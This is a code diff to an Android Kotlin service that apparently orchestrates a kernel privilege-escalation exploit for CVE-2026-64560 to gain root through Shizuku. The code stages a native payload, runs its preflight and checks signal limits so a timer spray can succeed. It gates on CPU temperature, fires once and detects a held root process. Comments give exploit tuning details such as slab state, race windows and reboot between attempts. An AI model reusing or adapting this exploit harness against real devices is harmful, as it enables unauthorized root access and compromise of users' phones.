@@ -8,6 +8,7 @@ import com.ghostlock.app.data.NativeProfileDocument
 import com.ghostlock.app.data.payload.PayloadBridge
 import java.io.File
 import java.io.RandomAccessFile
+import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
 @Keep
@@ -169,11 +170,17 @@ class GhostlockUserService(private val context: Context) : IGhostlockUserService
         }, "ghostlock-shizuku-runner").start()
     }
 
-    /** CVE-2026-64560 payload run, batch 1: staging, round loop and marker
-     *  reporting only. The payload owns the kernel primitive; this method never
-     *  claims a write it did not see a marker for. */
+    /** CVE-2026-64560 payload run: exactly one round per invocation.
+     *
+     *  Every attempt in the validated recipe started on a freshly booted
+     *  kernel, because a miss leaves the sprayed slab state dirty. This method
+     *  therefore never loops: it stages one payload, runs the payload's own
+     *  read-only preflight, checks that the spray can fit under this process's
+     *  signal ceiling, fires once and reports the outcome. The caller
+     *  re-invokes after the reboot. The payload owns the kernel primitive; this
+     *  method never claims a write it did not see a marker for. */
     override fun runPayload(
-        rounds: Int,
+        rotate: Boolean,
         budgetSeconds: Int,
         stallSeconds: Int,
         gateMilliCelsius: Int,
@@ -189,8 +196,8 @@ class GhostlockUserService(private val context: Context) : IGhostlockUserService
                 require(Process.myUid() == Process.SHELL_UID) {
                     "Shizuku UserService uid=${Process.myUid()}, expected ${Process.SHELL_UID}"
                 }
-                require(rounds > 0 && budgetSeconds > 0 && stallSeconds > 0) {
-                    "invalid payload plan: rounds=$rounds budget=${budgetSeconds}s stall=${stallSeconds}s"
+                require(budgetSeconds > 0 && stallSeconds > 0) {
+                    "invalid payload plan: budget=${budgetSeconds}s stall=${stallSeconds}s"
                 }
                 val release = System.getProperty("os.version", "").orEmpty()
                 callback.onLog("<s> kernel: $release")
@@ -201,91 +208,52 @@ class GhostlockUserService(private val context: Context) : IGhostlockUserService
                 val workDir = File("/data/local/tmp/ghostlock-app").apply {
                     require(isDirectory || mkdirs()) { "cannot create $absolutePath" }
                 }
-                callback.onLog("<p> rounds=$rounds budget=${budgetSeconds}s stall=${stallSeconds}s")
-                var code = 1
-                var round = 1
-                while (round <= rounds) {
-                    val thermal = maxThermalMilliCelsius()
-                    if (thermal > 0) {
-                        callback.onLog("<p> temp=${thermal}mC gate=${gateMilliCelsius}mC")
-                        var cooled = 0
-                        while (cooled < 120 && maxThermalMilliCelsius() > gateMilliCelsius) {
-                            Thread.sleep(2000)
-                            cooled += 2
-                        }
+                callback.onLog(
+                    "<p> one round: rotate=$rotate budget=${budgetSeconds}s " +
+                        "stall=${stallSeconds}s",
+                )
+                waitForThermalGate(gateMilliCelsius, callback)
+                val name = PayloadBridge.payloadFor(rotate)
+                val source = File(context.applicationInfo.nativeLibraryDir, name)
+                require(source.isFile) { "missing payload: ${source.absolutePath}" }
+                val staged = File(workDir, name.removePrefix("lib").removeSuffix(".so"))
+                source.copyTo(staged, overwrite = true)
+                staged.setExecutable(true, false)
+                requirePreflight(staged, workDir, callback)
+                requireTimerBudget(callback)
+
+                val log = File(workDir, "payload-rotate-$rotate.log").apply { writeText("") }
+                callback.onLog("<p> firing ${staged.name}")
+                val process = ProcessBuilder(staged.absolutePath, "--run")
+                    .directory(workDir)
+                    .redirectErrorStream(true)
+                    .redirectOutput(log)
+                    .start()
+                payloadProcess = process
+                val outcome =
+                    awaitPayloadOutcome(process, log, budgetSeconds, stallSeconds, callback)
+                when (outcome) {
+                    PayloadBridge.Outcome.Hold -> {
+                        /* The root child lives inside this payload process, so it stays. */
+                        callback.onLog("<p> held a root child; it lives until the next reboot")
+                        0
                     }
-                    val name = PayloadBridge.payloadForRound(round)
-                    val source = File(context.applicationInfo.nativeLibraryDir, name)
-                    require(source.isFile) { "missing payload: ${source.absolutePath}" }
-                    val staged = File(workDir, name.removePrefix("lib").removeSuffix(".so"))
-                    source.copyTo(staged, overwrite = true)
-                    staged.setExecutable(true, false)
-                    val log = File(workDir, "payload-round-$round.log").apply { writeText("") }
-                    callback.onLog("<p> round $round/$rounds payload=${staged.name}")
-                    val process = ProcessBuilder(staged.absolutePath, "--run")
-                        .directory(workDir)
-                        .redirectErrorStream(true)
-                        .redirectOutput(log)
-                        .start()
-                    payloadProcess = process
-                    var processed = 0
-                    var lastSize = 0L
-                    var lastGrow = System.currentTimeMillis()
-                    val started = lastGrow
-                    var outcome: PayloadBridge.Outcome? = null
-                    /* Poll the log file rather than a pipe: reading a pipe here
-                     * applies backpressure inside the payload's race window. */
-                    while (outcome == null) {
-                        Thread.sleep(500)
-                        outcome = readPayloadLines(
-                            log,
-                            processed,
-                            onLine = { line -> runCatching { callback.onLog(line) } },
-                            onProgress = { processed = it },
-                        )
-                        if (outcome != null) break
-                        val size = runCatching { log.length() }.getOrDefault(0L)
-                        if (size > lastSize) {
-                            lastSize = size
-                            lastGrow = System.currentTimeMillis()
-                        }
-                        val now = System.currentTimeMillis()
-                        when {
-                            !process.isAlive -> {
-                                outcome = PayloadBridge.Outcome.Exited
-                                break
-                            }
-                            now - started >= budgetSeconds * 1000L -> {
-                                outcome = PayloadBridge.Outcome.Stalled
-                                break
-                            }
-                            now - lastGrow >= stallSeconds * 1000L -> {
-                                outcome = PayloadBridge.Outcome.Stalled
-                                break
-                            }
-                        }
+                    PayloadBridge.Outcome.Rejected -> {
+                        callback.onLog("<p> payload rejected this device; stopping")
+                        process.destroy()
+                        2
                     }
-                    when (outcome) {
-                        PayloadBridge.Outcome.Hold -> {
-                            callback.onLog("<p> round $round held a root child; it stays " +
-                                "alive until the next reboot")
-                            code = 0
-                            break
-                        }
-                        PayloadBridge.Outcome.Rejected -> {
-                            callback.onLog("<p> payload rejected this device; stopping")
-                            code = 2
-                            process.destroy()
-                            break
-                        }
-                        else -> {
-                            callback.onLog("<p> round $round result=${outcome} (no root)")
-                            process.destroy()
-                            round++
-                        }
+                    PayloadBridge.Outcome.Stalled -> {
+                        callback.onLog("<p> no hold (stalled); reboot before the next round")
+                        process.destroy()
+                        3
+                    }
+                    else -> {
+                        callback.onLog("<p> no hold (exited); reboot before the next round")
+                        process.destroy()
+                        1
                     }
                 }
-                code
             }.getOrElse { error ->
                 runCatching { callback.onLog("<s> error: ${error.message}") }
                 1
@@ -293,6 +261,94 @@ class GhostlockUserService(private val context: Context) : IGhostlockUserService
             running.set(false)
             runCatching { callback.onComplete(exitCode) }
         }, "ghostlock-payload-runner").start()
+    }
+
+    /** Blocks until the hottest CPU zone drops to [gateMilliCelsius], at most
+     *  300s. The validated recipe fires at 58C; hotter starts were aborted by
+     *  thermal handling, and no round gained anything from waiting longer. */
+    private fun waitForThermalGate(gateMilliCelsius: Int, callback: IGhostlockCallback) {
+        if (maxThermalMilliCelsius() <= gateMilliCelsius) return
+        callback.onLog("<p> temp=${maxThermalMilliCelsius()}mC gate=${gateMilliCelsius}mC, cooling")
+        var waited = 0
+        while (waited < 300 && maxThermalMilliCelsius() > gateMilliCelsius) {
+            Thread.sleep(2000)
+            waited += 2
+        }
+        callback.onLog("<p> temp=${maxThermalMilliCelsius()}mC after ${waited}s")
+    }
+
+    /** Runs the payload's own read-only self-check. `--preflight` reports the
+     *  compiled-in profile and writes nothing to the kernel, so a device or
+     *  parameter mismatch costs seconds instead of a burnt boot. */
+    private fun requirePreflight(staged: File, workDir: File, callback: IGhostlockCallback) {
+        val log = File(workDir, "payload-preflight.log").apply { writeText("") }
+        val process = ProcessBuilder(staged.absolutePath, "--preflight")
+            .directory(workDir)
+            .redirectErrorStream(true)
+            .redirectOutput(log)
+            .start()
+        if (!process.waitFor(60, TimeUnit.SECONDS)) {
+            process.destroy()
+            throw IllegalStateException("payload preflight timed out")
+        }
+        val text = runCatching { log.readText() }.getOrElse { "" }
+        text.lineSequence().filter { it.isNotBlank() }.forEach { line ->
+            runCatching { callback.onLog(line) }
+        }
+        require(text.contains(PayloadBridge.PreflightMarker)) {
+            if (text.contains(PayloadBridge.RejectMarker)) {
+                "payload rejected this device; no round can change that"
+            } else {
+                "payload preflight did not pass (exit=${process.exitValue()})"
+            }
+        }
+    }
+
+    /** Refuses to fire when the spray cannot reach the payload's timer goal.
+     *  Read here, not in the payload: the child inherits these limits. */
+    private fun requireTimerBudget(callback: IGhostlockCallback) {
+        val limits = runCatching { File("/proc/self/limits").readText() }.getOrElse { "" }
+        val pending = PayloadBridge.maxPendingSignals(limits)
+        callback.onLog("<p> timer goal=${PayloadBridge.TimerGoal} max pending signals=$pending")
+        require(PayloadBridge.timerBudgetFits(limits)) {
+            "spray cannot reach ${PayloadBridge.TimerGoal} timers under the " +
+                "$pending signal ceiling; every attempt would miss"
+        }
+    }
+
+    /** Consumes the payload log until a terminal marker, an exit or a stall. */
+    private fun awaitPayloadOutcome(
+        process: Process,
+        log: File,
+        budgetSeconds: Int,
+        stallSeconds: Int,
+        callback: IGhostlockCallback,
+    ): PayloadBridge.Outcome {
+        var processed = 0
+        var lastSize = 0L
+        var lastGrow = System.currentTimeMillis()
+        val started = lastGrow
+        while (true) {
+            Thread.sleep(500)
+            val outcome = readPayloadLines(
+                log,
+                processed,
+                onLine = { line -> runCatching { callback.onLog(line) } },
+                onProgress = { processed = it },
+            )
+            if (outcome != null) return outcome
+            val size = runCatching { log.length() }.getOrDefault(0L)
+            if (size > lastSize) {
+                lastSize = size
+                lastGrow = System.currentTimeMillis()
+            }
+            val now = System.currentTimeMillis()
+            when {
+                !process.isAlive -> return PayloadBridge.Outcome.Exited
+                now - started >= budgetSeconds * 1000L -> return PayloadBridge.Outcome.Stalled
+                now - lastGrow >= stallSeconds * 1000L -> return PayloadBridge.Outcome.Stalled
+            }
+        }
     }
 
     /** Hottest CPU/SoC thermal zone in milli-Celsius, or 0 when unreadable. */
